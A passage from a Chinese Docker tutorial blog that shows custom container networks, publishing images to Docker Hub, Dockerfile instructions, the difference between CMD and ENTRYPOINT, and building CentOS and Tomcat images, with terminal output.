&quot;ConfigFrom&quot;: &#123; &quot;Network&quot;: &quot;&quot; &#125;, &quot;ConfigOnly&quot;: false, &quot;Containers&quot;: &#123;&#125;, &quot;Options&quot;: &#123;&#125;, &quot;Labels&quot;: &#123;&#125; &#125;]# 设置网络模式为自己创建的网络mynet，建立tomcat-net-01和tomcat-net-02[root@VM-0-15-centos ~]# docker run -d -P --name tomcat-net-01 --net mynet tomcate067a02080bb5ad3bf38496c5cb5f5a6274ac3e67d3ec378106485e3c98ad470[root@VM-0-15-centos ~]# docker run -d -P --name tomcat-net-02 --net mynet tomcat830a53b87c0758aa8c985195b83b63f4e2dbebdb5e99b5bba5a39ca349a12650# inspect命令查看meynet网络信息，可以看到多了两个对应的新加入的container（容器）[root@VM-0-15-centos ~]# docker network inspect mynet[root@VM-0-15-centos ~]# docker network inspect mynet[ &#123; &quot;Name&quot;: &quot;mynet&quot;, &quot;Id&quot;: &quot;b93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340&quot;, &quot;Created&quot;: &quot;2021-09-06T00:59:48.490085063+08:00&quot;, &quot;Scope&quot;: &quot;local&quot;, &quot;Driver&quot;: &quot;bridge&quot;, &quot;EnableIPv6&quot;: false, &quot;IPAM&quot;: &#123; &quot;Driver&quot;: &quot;default&quot;, &quot;Options&quot;: &#123;&#125;, &quot;Config&quot;: [ &#123; &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;, &quot;Gateway&quot;: &quot;192.168.0.1&quot; &#125; ] &#125;, &quot;Internal&quot;: false, &quot;Attachable&quot;: false, &quot;Ingress&quot;: false, &quot;ConfigFrom&quot;: &#123; &quot;Network&quot;: &quot;&quot; &#125;, &quot;ConfigOnly&quot;: false, &quot;Containers&quot;: &#123; &quot;830a53b87c0758aa8c985195b83b63f4e2dbebdb5e99b5bba5a39ca349a12650&quot;: &#123; &quot;Name&quot;: &quot;tomcat-net-02&quot;, &quot;EndpointID&quot;: &quot;d86423260674d0300b6d1da749c5dad721683966b1d4bc59e714a317c60c7df9&quot;, &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:03&quot;, &quot;IPv4Address&quot;: &quot;192.168.0.3/16&quot;, &quot;IPv6Address&quot;: &quot;&quot; &#125;, &quot;e067a02080bb5ad3bf38496c5cb5f5a6274ac3e67d3ec378106485e3c98ad470&quot;: &#123; &quot;Name&quot;: &quot;tomcat-net-01&quot;, &quot;EndpointID&quot;: &quot;c182a6883d2c0f19137f5085dce4415a4eaf49d5e04cc1775a84f0e0f2482995&quot;, &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:02&quot;, &quot;IPv4Address&quot;: &quot;192.168.0.2/16&quot;, &quot;IPv6Address&quot;: &quot;&quot; &#125; &#125;, &quot;Options&quot;: &#123;&#125;, &quot;Labels&quot;: &#123;&#125; &#125;]# 自定义的网络完善了docker0不支持容器名访问的缺点和--link不能相互ping通的缺点，只要是在同一自定义网络下，都能直接通过容器名相互ping通[root@VM-0-15-centos ~]# docker exec -it tomcat-net-01 ping 192.168.0.3PING 192.168.0.3 (192.168.0.3) 56(84) bytes of data.64 bytes from 192.168.0.3: icmp_seq=1 ttl=64 time=0.096 ms64 bytes from 192.168.0.3: icmp_seq=2 ttl=64 time=0.071 ms[root@VM-0-15-centos ~]# docker exec -it tomcat-net-02 ping 192.168.0.2PING 192.168.0.2 (192.168.0.2) 56(84) bytes of data.64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=0.084 ms64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.064 ms 四、网络连通 测试# 尝试用tomcat01 ping tomcat-net-01，ping不通，因为网络没有连通[root@VM-0-15-centos ~]# docker exec -it tomcat01 ping tomcat-net-01ping: tomcat-net-01: Name or service not known# 将tomcat01加入到网络mynet中[root@VM-0-15-centos ~]# docker network connect mynet tomcat01# 查看mynet的信息，可以看到tomcat01加入了mynet，并有了个IPv4地址：192.168.0.4/16[root@VM-0-15-centos ~]# docker network inspect mynet # 相当于给tomcat01一块新的网卡，这块网卡选择加入mynet中[root@VM-0-15-centos ~]# docker exec -it tomcat01 ip addr # 本机IP信息[root@VM-0-15-centos ~]# ip addr # tomcat01可以ping通tomcat-net-01了[root@VM-0-15-centos ~]# docker exec -it tomcat01 ping tomcat-net-01PING tomcat-net-01 (192.168.0.2) 56(84) bytes of data.64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=1 ttl=64 time=0.081 ms64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=2 ttl=64 time=0.065 ms64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=3 ttl=64 time=0.066 ms &emsp;&emsp;网络模型 五、实战","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"发布自己的镜像","slug":"发布自己的镜像","date":"2021-12-13T12:12:35.000Z","updated":"2022-01-15T07:46:01.149Z","comments":true,"path":"post/23e16792.html","link":"","permalink":"https://wolke.cn/post/23e16792.html","excerpt":"","text":"&emsp;&emsp;地址：https://hub.docker.com/ 注册自己的账号 &emsp;&emsp;在我们服务器上登录自己的DockerHub账号：docker login -u 用户名 -p 密码 &emsp;&emsp;登录完毕就可以提交自己镜像了：docker push 用户名/镜像名:TAG 这里我先用docker tag 镜像ID ...命令对镜像进行了重命名和TAG设置 &emsp;&emsp;push成功 &emsp;&emsp;查看DockerHub的确上传成功了","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"dockerfile文件","slug":"dockerfile文件","date":"2021-12-13T12:00:16.000Z","updated":"2022-01-03T03:26:53.157Z","comments":true,"path":"post/fba1b6b.html","link":"","permalink":"https://wolke.cn/post/fba1b6b.html","excerpt":"","text":"一、什么是DockerFile&emsp;&emsp;Dockerfile是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。Docker通过读取Dockerfile中的指令自动生成映像。 &emsp;&emsp;docker build命令用于从Dockerfile构建映像。可以在docker build命令中使用-f标志指向文件系统中任何位置的Dockerfile。例如docker build -f /path/to/a/Dockerfile &emsp;&emsp;可以理解为：DockerFile是代码，镜像是代码写好的类，容器是类创建出来的对象 二、Dockerfile的基本结构DockerFile 一般分为四部分： 基础镜像信息 维护者信息 镜像操作指令 容器启动时执行指令 #为 DockerFile 中的注释。 三、DockerFile构建过程（1）每个保留关键字（指令）都必须是大写字母 （2）指令从上到下顺序执行 （3）# 表示注释 （4）每一个指令都会创建提交一个新的镜像层，并提交！ DockerFile是面向开发的，我们以后要发布项目，做镜像，就需要编写DockerFile文件，这个文件十分简单 Docker镜像逐渐成为企业交付的标准，必须要掌握，构建步骤 1、编写一个DockerFile文件 2、docker build 构建成为一个镜像 3、docker run 运行镜像 4、docker push 发布镜像 步骤：开发，部署，运维……缺一不可 DockerFile：构建文件，定义了一切的步骤，源代码 DockerImages：通过DockerFile构建生成的镜像，最终发布和运行的产品 Docker容器：容器就是镜像运行起来提供服务 四、DockerFile文件说明&emsp;&emsp;Docker以从上到下的顺序运行Dockerfile的指令。为了指定基本映像，第一条指令必须是FROM。一个声明以＃字符开头则被视为注释。可以在Docker文件中使用RUN，CMD，FROM，EXPOSE，ENV等指令。 1、 一些指令（1）FROM&emsp;&emsp;指定基础镜像，必须为第一个命令 格式： FROM &lt;image&gt; FROM &lt;image&gt;:&lt;tag&gt; FROM &lt;image&gt;@&lt;digest&gt;示例： FROM mysql:5.6注： tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像 （2）MAINTAINER&emsp;&emsp;维护者信息 格式： MAINTAINER &lt;name&gt; 示例： MAINTAINER Jasper Xu MAINTAINER sorex@163.com MAINTAINER Jasper Xu &lt;sorex@163.com&gt; （3）RUN&emsp;&emsp;构建镜像时执行的命令 &emsp;&emsp;注意：RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定–no-cache参数，如：docker build --no-cache RUN用于在镜像容器中执行命令，其有以下两种命令执行方式：shell执行格式： RUN &lt;command&gt;exec执行格式： RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]示例： RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] RUN apk update RUN [&quot;/etc/execfile&quot;, &quot;arg1&quot;, &quot;arg1&quot;] （4）ADD&emsp;&emsp;将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget 格式： ADD &lt;src&gt;... &lt;dest&gt; ADD [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;] 用于支持包含空格的路径示例： ADD hom* /mydir/ # 添加所有以&quot;hom&quot;开头的文件 ADD hom?.txt /mydir/ # ? 替代一个单字符,例如：&quot;home.txt&quot; ADD test relativeDir/ # 添加 &quot;test&quot; 到 `WORKDIR`/relativeDir/ ADD test /absoluteDir/ # 添加 &quot;test&quot; 到 /absoluteDir/ （5）COPY&emsp;&emsp;功能类似ADD，但是不会自动解压文件，也不能访问网络资源 （6）CMD&emsp;&emsp;构建容器后调用，也就是在容器启动时才进行调用 &emsp;&emsp;注意： CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。 每个Dockfile只能有一条CMD命令，如果指定了多条，只有最后一条会执行。 如果用户启动容器时指定了运行命令，则会覆盖CMD指定命令。下面的实战部分会分析这部分内容 格式： CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] (执行可执行文件，优先) CMD [&quot;param1&quot;,&quot;param2&quot;] (设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数) CMD command param1 param2 (执行shell内部命令)示例： CMD echo &quot;This is a test.&quot; | wc - CMD [&quot;/usr/bin/wc&quot;,&quot;--help&quot;] （7）ENTRYPOINT&emsp;&emsp;配置容器，使其可执行化。配合CMD可省去”application”，只使用参数。 &emsp;&emsp;注意：ENTRYPOINT与CMD非常类似，不同的是通过docker run执行的命令不会覆盖ENTRYPOINT，而docker run命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。 格式： ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] (可执行文件, 优先) ENTRYPOINT command param1 param2 (shell内部命令)示例： FROM ubuntu ENTRYPOINT [&quot;top&quot;, &quot;-b&quot;] CMD [&quot;-c&quot;] （8）LABEL&emsp;&emsp;用于为镜像添加元数据 &emsp;&emsp;注意：使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐将所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。 格式： LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...示例： LABEL version=&quot;1.0&quot; description=&quot;这是一个Web服务器&quot; by=&quot;IT笔录&quot; （9）ENV&emsp;&emsp;设置环境变量 格式： ENV &lt;key&gt; &lt;value&gt; #&lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此，一次只能设置一个变量 ENV &lt;key&gt;=&lt;value&gt; ... #可以设置多个变量，每个变量为一个&quot;&lt;key&gt;=&lt;value&gt;&quot;的键值对，如果&lt;key&gt;中包含空格，可以使用\\来进行转义，也可以通过&quot;&quot;来进行标示；另外，反斜线也可以用于续行示例： ENV myName John Doe ENV myDog Rex The Dog ENV myCat=fluffy （10）EXPOSE&emsp;&emsp;指定于外界交互的端口 &emsp;&emsp;注意：EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在docker run运行容器时通过-p来发布这些端口，或通过-P参数来发布EXPOSE导出的所有端口 格式： EXPOSE &lt;port&gt; [&lt;port&gt;...]示例： EXPOSE 80 443 EXPOSE 8080 EXPOSE 11211/tcp 11211/udp （11）VOLUME用于指定持久化目录 注意：一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能： 1、卷可以容器间共享和重用 2、容器并不一定要和其它容器共享卷 3、修改卷后会立即生效 4、对卷的修改不会对镜像产生影响 5、卷会一直存在，直到没有任何容器在使用它 格式： VOLUME [&quot;/path/to/dir&quot;]示例： VOLUME [&quot;/data&quot;] VOLUME [&quot;/var/www&quot;, &quot;/var/log/apache2&quot;, &quot;/etc/apache2&quot; （12）WORKDIR工作目录，类似于cd命令 注意：通过WORKDIR设置工作目录后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT、ADD、COPY等命令都会在该目录下执行。在使用docker run运行容器时，可以通过-w参数覆盖构建时所设置的工作目录。 格式： WORKDIR /path/to/workdir示例： WORKDIR /a (这时工作目录为/a) WORKDIR b (这时工作目录为/a/b) WORKDIR c (这时工作目录为/a/b/c) （13）USER&emsp;&emsp;指定运行容器时的用户名或 UID，后续的 RUN 也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或是两者的组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户 注意：使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过docker run运行容器时，可以通过-u参数来覆盖所指定的用户。 格式: USER user USER user:group USER uid USER uid:gid USER user:gid USER uid:group 示例： USER www （14）ARG&emsp;&emsp;用于指定传递给构建运行时的变量 格式： ARG &lt;name&gt;[=&lt;default value&gt;]示例： ARG site ARG build_user=www （15）ONBUILD&emsp;&emsp;用于设置镜像触发器 注意：当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被触发 格式： ONBUILD [INSTRUCTION]示例： ONBUILD ADD . /app/src ONBUILD RUN /usr/local/bin/python-build --dir /app/src 2、例子# This my first nginx Dockerfile# Version 1.0# Base images 基础镜像FROM centos#MAINTAINER 维护者信息MAINTAINER tianfeiyu #ENV 设置环境变量ENV PATH /usr/local/nginx/sbin:$PATH#ADD 文件放在当前目录下，拷过去会自动解压ADD nginx-1.8.0.tar.gz /usr/local/ ADD epel-release-latest-7.noarch.rpm /usr/local/ #RUN 执行以下命令 RUN rpm -ivh /usr/local/epel-release-latest-7.noarch.rpmRUN yum install -y wget lftp gcc gcc-c++ make openssl-devel pcre-devel pcre &amp;&amp; yum clean allRUN useradd -s /sbin/nologin -M www#WORKDIR 相当于cdWORKDIR /usr/local/nginx-1.8.0 RUN ./configure --prefix=/usr/local/nginx --user=www --group=www --with-http_ssl_module --with-pcre &amp;&amp; make &amp;&amp; make installRUN echo &quot;daemon off;&quot; &gt;&gt; /etc/nginx.conf#EXPOSE 映射端口EXPOSE 80#CMD 运行以下命令CMD [&quot;nginx&quot;] 3、总结 五、实战：构建自己的CentOS1、编写DockerFile配置文件FROM centos #指定centos为基础镜像MAINTAINER xdd&lt;123456@qq.com&gt; #维护者信息 ENV MYPATH /usr/local # $MYPATH=&quot;/usr/local&quot;WORKDIR $MYPATH #将工作目录设置为/usr/localRUN yum -y install vim #构建镜像时下载安装vimRUN yum -y install net-tools #构建镜像时下载安装net-toolsEXPOSE 80 #暴露80端口CMD echo $MYPATH #容器启动时输出$MYPATHCMD echo &quot;----end----&quot; #覆盖上一个CMD，容器启动时输出----end----CMD /bin/bash #覆盖上一个CMD，容器启动时进入/bin/bash 2、通过编写的DockerFile文件构建镜像&emsp;&emsp;命令说明：docker build -f mydockerfile-centos -t mycentos:0.1 . &emsp;&emsp;docker build -f DockerFile文件路径 -t 镜像名[:TAG]，**.**指定从当前目录出发寻找DockerFile [root@VM-0-15-centos dockerfile]# docker build -f mydockerfile-centos -t mycentos:0.1 .Sending build context to Docker daemon 2.048kBStep 1/10 : FROM centos ---&gt; 300e315adb2fStep 2/10 : MAINTAINER xdd&lt;123456@qq.com&gt; ---&gt; Running in 9c08beadb2c8Removing intermediate container 9c08beadb2c8 ---&gt; e9adad42af2cStep 3/10 : ENV MYPATH /usr/local ---&gt; Running in cdbbbb85ee6bRemoving intermediate container cdbbbb85ee6b ---&gt; 8fcacdecf7adStep 4/10 : WORKDIR $MYPATH ---&gt; Running in 11ea6ae34521Removing intermediate container 11ea6ae34521 ---&gt; 718b6ad3e5efStep 5/10 : RUN yum -y install vim ---&gt; Running in a0431f8c2a80CentOS Linux 8 - AppStream 8.4 MB/s | 8.8 MB 00:01CentOS Linux 8 - BaseOS 6.4 MB/s | 5.6 MB 00:00CentOS Linux 8 - Extras 17 kB/s | 10 kB 00:00Dependencies resolved.================================================================================ Package Arch Version Repository Size================================================================================Installing: vim-enhanced x86_64 2:8.0.1763-15.el8 appstream 1.4 MInstalling dependencies: gpm-libs x86_64 1.20.7-17.el8 appstream 39 k vim-common x86_64 2:8.0.1763-15.el8 appstream 6.3 M vim-filesystem noarch 2:8.0.1763-15.el8 appstream 48 k which x86_64 2.21-12.el8 baseos 49 kTransaction Summary================================================================================Install 5 PackagesTotal download size: 7.8 MInstalled size: 30 MDownloading Packages:(1/5): gpm-libs-1.20.7-17.el8.x86_64.rpm 342 kB/s | 39 kB 00:00(2/5): vim-filesystem-8.0.1763-15.el8.noarch.rp 842 kB/s | 48 kB 00:00(3/5): vim-enhanced-8.0.1763-15.el8.x86_64.rpm 5.0 MB/s | 1.4 MB 00:00(4/5): which-2.21-12.el8.x86_64.rpm 384 kB/s | 49 kB 00:00(5/5): vim-common-8.0.1763-15.el8.x86_64.rpm 15 MB/s | 6.3 MB 00:00--------------------------------------------------------------------------------Total 5.8 MB/s | 7.8 MB 00:01warning: /var/cache/dnf/appstream-02e86d1c976ab532/packages/gpm-libs-1.20.7-17.el8.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID 8483c65d: NOKEYCentOS Linux 8 - AppStream 1.6 MB/s | 1.6 kB 00:00Importing GPG key 0x8483C65D: Userid : &quot;CentOS (CentOS Official Signing Key) &lt;security@centos.org&gt;&quot; Fingerprint: 99DB 70FA E1D7 CE22 7FB6 4882 05B5 55B3 8483 C65D From : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficialKey imported successfullyRunning transaction checkTransaction check succeeded.Running transaction testTransaction test succeeded.Running transaction Preparing : 1/1 Installing : which-2.21-12.el8.x86_64 1/5 Installing : vim-filesystem-2:8.0.1763-15.el8.noarch 2/5 Installing : vim-common-2:8.0.1763-15.el8.x86_64 3/5 Installing : gpm-libs-1.20.7-17.el8.x86_64 4/5 Running scriptlet: gpm-libs-1.20.7-17.el8.x86_64 4/5 Installing : vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-common-2:8.0.1763-15.el8.x86_64 5/5 Verifying : gpm-libs-1.20.7-17.el8.x86_64 1/5 Verifying : vim-common-2:8.0.1763-15.el8.x86_64 2/5 Verifying : vim-enhanced-2:8.0.1763-15.el8.x86_64 3/5 Verifying : vim-filesystem-2:8.0.1763-15.el8.noarch 4/5 Verifying : which-2.21-12.el8.x86_64 5/5Installed: gpm-libs-1.20.7-17.el8.x86_64 vim-common-2:8.0.1763-15.el8.x86_64 vim-enhanced-2:8.0.1763-15.el8.x86_64 vim-filesystem-2:8.0.1763-15.el8.noarch which-2.21-12.el8.x86_64Complete!Removing intermediate container a0431f8c2a80 ---&gt; b24fe1460a37Step 6/10 : RUN yum -y install net-tools ---&gt; Running in 8d93802f92efLast metadata expiration check: 0:00:09 ago on Thu Sep 2 22:08:45 2021.Dependencies resolved.================================================================================ Package Architecture Version Repository Size================================================================================Installing: net-tools x86_64 2.0-0.52.20160912git.el8 baseos 322 kTransaction Summary================================================================================Install 1 PackageTotal download size: 322 kInstalled size: 942 kDownloading Packages:net-tools-2.0-0.52.20160912git.el8.x86_64.rpm 1.5 MB/s | 322 kB 00:00--------------------------------------------------------------------------------Total 496 kB/s | 322 kB 00:00Running transaction checkTransaction check succeeded.Running transaction testTransaction test succeeded.Running transaction Preparing : 1/1 Installing : net-tools-2.0-0.52.20160912git.el8.x86_64 1/1 Running scriptlet: net-tools-2.0-0.52.20160912git.el8.x86_64 1/1 Verifying : net-tools-2.0-0.52.20160912git.el8.x86_64 1/1Installed: net-tools-2.0-0.52.20160912git.el8.x86_64Complete!Removing intermediate container 8d93802f92ef ---&gt; 21faf23714e9Step 7/10 : EXPOSE 80 ---&gt; Running in 9330ed9b0c59Removing intermediate container 9330ed9b0c59 ---&gt; 0979d2a554a2Step 8/10 : CMD echo $MYPATH ---&gt; Running in 44f2eb41253fRemoving intermediate container 44f2eb41253f ---&gt; 77875e680c66Step 9/10 : CMD echo &quot;----end----&quot; ---&gt; Running in 0d852a5a41baRemoving intermediate container 0d852a5a41ba ---&gt; 6accda5d54d3Step 10/10 : CMD /bin/bash ---&gt; Running in ebce2e1a01caRemoving intermediate container ebce2e1a01ca ---&gt; e49ddd3b677cSuccessfully built e49ddd3b677cSuccessfully tagged mycentos:0.1 3、测试运行&emsp;&emsp;原始centos &emsp;&emsp;docker run -it mycentos:0.1，docker run命令如果指定了参数会把CMD里的参数覆盖。这里说明一下，如：docker run -it mycentos:0.1 /bin/echo hello 命令的参数是指/bin/echo hello而非-it，-it只是docker的参数，而不是容器的参数，因此如果使用此命令，会覆盖CMD的/bin/bash，输出hello。而这里没有指定参数，因此直接就进入了/bin/bash，而不需要像平时一样docker run -it mycentos:0.1 /bin/bash多写一个/bin/bash。想要运行多个命令，可以使用ENTRYPOINT 指令 指定一个文件，文件中写多个指令即可。 &emsp;&emsp;新的centos &emsp;&emsp;另外，还可以通过docker history 镜像ID/镜像名称查看镜像的构造历史 &emsp;&emsp;docker history mycentos:0.1，可以看到，最终的centos镜像是一层一层叠加起来的，很符合这个理念图 六、CMD和ENTRYPOINT区别1、CMD#构建DockerFile文件[root@VM-0-15-centos dockerfile]# vim docker-file-cmd#Dockerfile内容FROM centosCMD [&quot;ls&quot;,&quot;-a&quot;]#构建镜像[root@VM-0-15-centos dockerfile]# docker build -f docker-file-cmd -t cmdtest .Sending build context to Docker daemon 3.072kBStep 1/2 : FROM centos ---&gt; 300e315adb2fStep 2/2 : CMD [&quot;ls&quot;,&quot;-a&quot;] ---&gt; Running in 9f3bac8d1665Removing intermediate container 9f3bac8d1665 ---&gt; 23a0e7ffae6aSuccessfully built 23a0e7ffae6aSuccessfully tagged cmdtest:latest#启动容器，调用了ls -a[root@VM-0-15-centos dockerfile]# docker run cmdtest....dockerenvbindevetchomeliblib64lost+foundmediamntoptprocrootrunsbinsrvsystmpusrvar#想着实现ls -a -l的效果，直接在后面加入-l，那么-l就覆盖了ls -a，因此失败了[root@VM-0-15-centos dockerfile]# docker run cmdtest -ldocker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: &quot;-l&quot;: executable file not found in $PATH: unknown.#正确的方法实现ls -a -l的效果[root@VM-0-15-centos dockerfile]# docker run cmdtest ls -altotal 56drwxr-xr-x 1 root root 4096 Sep 2 23:28 .drwxr-xr-x 1 root root 4096 Sep 2 23:28 ..-rwxr-xr-x 1 root root 0 Sep 2 23:28 .dockerenvlrwxrwxrwx 1 root root 7 Nov 3 2020 bin -&gt; usr/bindrwxr-xr-x 5 root root 340 Sep 2 23:28 devdrwxr-xr-x 1 root root 4096 Sep 2 23:28 etcdrwxr-xr-x 2 root root 4096 Nov 3 2020 homelrwxrwxrwx 1 root root 7 Nov 3 2020 lib -&gt; usr/liblrwxrwxrwx 1 root root 9 Nov 3 2020 lib64 -&gt; usr/lib64drwx------ 2 root root 4096 Dec 4 2020 lost+founddrwxr-xr-x 2 root root 4096 Nov 3 2020 mediadrwxr-xr-x 2 root root 4096 Nov 3 2020 mntdrwxr-xr-x 2 root root 4096 Nov 3 2020 optdr-xr-xr-x 148 root root 0 Sep 2 23:28 procdr-xr-x--- 2 root root 4096 Dec 4 2020 rootdrwxr-xr-x 11 root root 4096 Dec 4 2020 runlrwxrwxrwx 1 root root 8 Nov 3 2020 sbin -&gt; usr/sbindrwxr-xr-x 2 root root 4096 Nov 3 2020 srvdr-xr-xr-x 13 root root 0 Sep 2 23:28 sysdrwxrwxrwt 7 root root 4096 Dec 4 2020 tmpdrwxr-xr-x 12 root root 4096 Dec 4 2020 usrdrwxr-xr-x 20 root root 4096 Dec 4 2020 var[root@VM-0-15-centos dockerfile]# 2、ENTRYPOINT#构建DockerFile文件[root@VM-0-15-centos dockerfile]# vim docker-file-entrypoint#Dockerfile内容FROM centosENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;]#构建镜像[root@VM-0-15-centos dockerfile]# docker build -f docker-file-entrypoint -t entrypointtest .Sending build context to Docker daemon 4.096kBStep 1/2 : FROM centos ---&gt; 300e315adb2fStep 2/2 : ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;] ---&gt; Running in df8bced1251dRemoving intermediate container df8bced1251d ---&gt; 0691387ed2a7Successfully built 0691387ed2a7Successfully tagged entrypointtest:latest#启动容器，调用了ls -a[root@VM-0-15-centos dockerfile]# docker run entrypointtest....dockerenvbindevetchomeliblib64lost+foundmediamntoptprocrootrunsbinsrvsystmpusrvar#想着实现ls -a -l的效果，直接在后面加入-l，那么ls -a就追加了-l，因此成功了[root@VM-0-15-centos dockerfile]# docker run entrypointtest -ltotal 56drwxr-xr-x 1 root root 4096 Sep 2 23:32 .drwxr-xr-x 1 root root 4096 Sep 2 23:32 ..-rwxr-xr-x 1 root root 0 Sep 2 23:32 .dockerenvlrwxrwxrwx 1 root root 7 Nov 3 2020 bin -&gt; usr/bindrwxr-xr-x 5 root root 340 Sep 2 23:32 devdrwxr-xr-x 1 root root 4096 Sep 2 23:32 etcdrwxr-xr-x 2 root root 4096 Nov 3 2020 homelrwxrwxrwx 1 root root 7 Nov 3 2020 lib -&gt; usr/liblrwxrwxrwx 1 root root 9 Nov 3 2020 lib64 -&gt; usr/lib64drwx------ 2 root root 4096 Dec 4 2020 lost+founddrwxr-xr-x 2 root root 4096 Nov 3 2020 mediadrwxr-xr-x 2 root root 4096 Nov 3 2020 mntdrwxr-xr-x 2 root root 4096 Nov 3 2020 optdr-xr-xr-x 150 root root 0 Sep 2 23:32 procdr-xr-x--- 2 root root 4096 Dec 4 2020 rootdrwxr-xr-x 11 root root 4096 Dec 4 2020 runlrwxrwxrwx 1 root root 8 Nov 3 2020 sbin -&gt; usr/sbindrwxr-xr-x 2 root root 4096 Nov 3 2020 srvdr-xr-xr-x 13 root root 0 Sep 2 23:28 sysdrwxrwxrwt 7 root root 4096 Dec 4 2020 tmpdrwxr-xr-x 12 root root 4096 Dec 4 2020 usrdrwxr-xr-x 20 root root 4096 Dec 4 2020 var#ls -a追加ls -al变成了ls -a ls -al，因此失败[root@VM-0-15-centos dockerfile]# docker run entrypointtest ls -alls: cannot access &#x27;ls&#x27;: No such file or directory 七、实战：Tomcat镜像1、文件准备&emsp;&emsp;准备镜像文件，tomcat压缩包（官网下载），jdk压缩包（官网下载），新建一个空的readme.txt文件 &emsp;&emsp;也可用我下载好的，百度网盘链接：https://pan.baidu.com/s/1QjtWSmtvss5fUUex5I_ISQ 提取码：ccfj 2、编写dockerfile文件&emsp;&emsp;官方命名 Dockerfile ，build的时候会自动寻找这个文件，就不需要**-f**指定了 FROM centosMAINTAINER xdd&lt;123456789@qq.com&gt;COPY readme.txt /usr/local/readme.txtADD jdk-8u301-linux-x64.tar.gz /usr/localADD apache-tomcat-10.0.10.tar.gz /usr/localRUN yum -y install vimENV MYPATH /usr/localWORKDIR $MYPATH#注意这个如果用的跟我一样必须是jdk1.8.0_301，不然后面会报错运行不起来tomcat，深刻教训#错误示范：ENV JAVA_HOME /usr/local/jdk8u301 我想当然的就设置了个名字，结果是错的#解压后的名字为jdk1.8.0_301，因此这里最好也设置jdk1.8.0_301ENV JAVA_HOME /usr/local/jdk1.8.0_301ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV CATALINA_HOME /usr/local/apache-tomcat-10.0.10ENV CATALINA_BASH /usr/local/apache-tomcat-10.0.10ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080#tail -F:等同于--follow=name --retry，根据文件名进行追踪，并保持重试，即该文件被删除或改名后，如果再次创建相同的文件名，会继续追踪CMD /usr/local/apache-tomcat-10.0.10/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-10.0.10/logs/catalina.out 3、构建镜像&emsp;&emsp;docker build -t diytomcat . [root@VM-0-15-centos tomcat]# docker build -t diytomcat .Sending build context to Docker daemon 157.4MBStep 1/15 : FROM centos ---&gt; 300e315adb2fStep 2/15 : MAINTAINER xdd&lt;123456789@qq.com&gt; ---&gt; Running in d3da61a8177aRemoving intermediate container d3da61a8177a ---&gt; 9e1df92badf0Step 3/15 : COPY readme.txt /usr/local/readme.txt ---&gt; 22fc0081ce2dStep 4/15 : ADD jdk-8u301-linux-x64.tar.gz /usr/local ---&gt; f4ec24113686Step 5/15 : ADD apache-tomcat-10.0.10.tar.gz /usr/local ---&gt; a1b470e2bd7dStep 6/15 : RUN yum -y install vim ---&gt; Running in 614daf07d5b9CentOS Linux 8 - AppStream 9.0 MB/s | 8.8 MB 00:00CentOS Linux 8 - BaseOS 8.2 MB/s | 5.6 MB 00:00CentOS Linux 8 - Extras 11 kB/s | 10 kB 00:00Last metadata expiration check: 0:00:01 ago on Sat Sep 4 16:37:32 2021.Dependencies resolved.================================================================================ Package Arch Version Repository Size================================================================================Installing: vim-enhanced x86_64 2:8.0.1763-15.el8 appstream 1.4 MInstalling dependencies: gpm-libs x86_64 1.20.7-17.el8 appstream 39 